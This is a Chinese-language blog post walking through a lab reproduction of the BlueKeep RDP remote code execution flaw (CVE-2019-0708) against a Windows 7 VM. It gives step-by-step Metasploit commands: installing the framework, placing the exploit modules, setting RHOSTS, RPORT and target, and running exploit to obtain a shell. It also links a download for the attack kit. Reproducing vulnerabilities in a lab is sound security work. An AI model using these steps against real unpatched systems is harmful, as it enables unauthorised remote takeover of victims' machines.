# CVE-2019-0708 远程桌面代码执行漏洞复现 - xyongsec - 博客园

> 原文：[`www.cnblogs.com/xyongsec/p/11491528.html`](https://www.cnblogs.com/xyongsec/p/11491528.html)

### 漏洞环境

使用 VMware 安装 Windows7 SP1 模拟受害机

![](img/4b3b59b4df9b498bd3b0b88eda4dd5de.png)

### 利用

#### 攻击工具准备

*   1.使用如下命令一键更新安装的 metasploit 框架
*   ```
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb> msfinstall && chmod 755 msfinstall && ./msfinstall
    ```

*   2.下载参考中的攻击套件放置文件到 MSF 的相应文件夹（如果已存在同名文件，直接覆盖即可）
*   ```
    rdp.rb  - > /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
    rdp_scanner.rb - > /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
    cve_2019_0708_bluekeep.rb - > /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
    cve_2019_0708_bluekeep_rce.rb - > /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
    ```

![](img/312d74b7aadb8fa7712327c4b2dd7a03.png)

#### 攻击命令

#### 使用`msfconsole`展示进入 Metasploit 的框架

#### 展示进入以后使用`reload_all`重新加载 0708rdp 模块利用

#### **使用`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`启用 0708RDP 模块攻击**

#### *****使用`info`查看工具相关信息以及设置*****

![](img/a58bc7012d887ff1b62f2b26ed1c9fdf.png)

 可见关键设置主要为`RHOSTS`\ `RPORT`\`target`

`使用`set RHOSTS 受害机 IP`设置受害机 IP`

 `使用`set RPORT 受害机 PORT`设置受害机 RDP 端口号

使用`set target ID 数字(可选为 0-4)`设置受害机机器架构

*****这里我们使用的是 VMware ，那么目标 2 满足条件*****

******使用`exploit`开始攻击，等待建立连接 建立连接以后，使用获得 shell，再使用获得交互式外壳 随即完成攻击，成功拿到受害者主机权限******

![](img/d37308a80ace8a32579220c6158853e1.png)

### 参考

### *链接：https://pan.baidu.com/s/1v3B8Vvi26W7LWjO3IcsNZg ***提取码：ml9g **`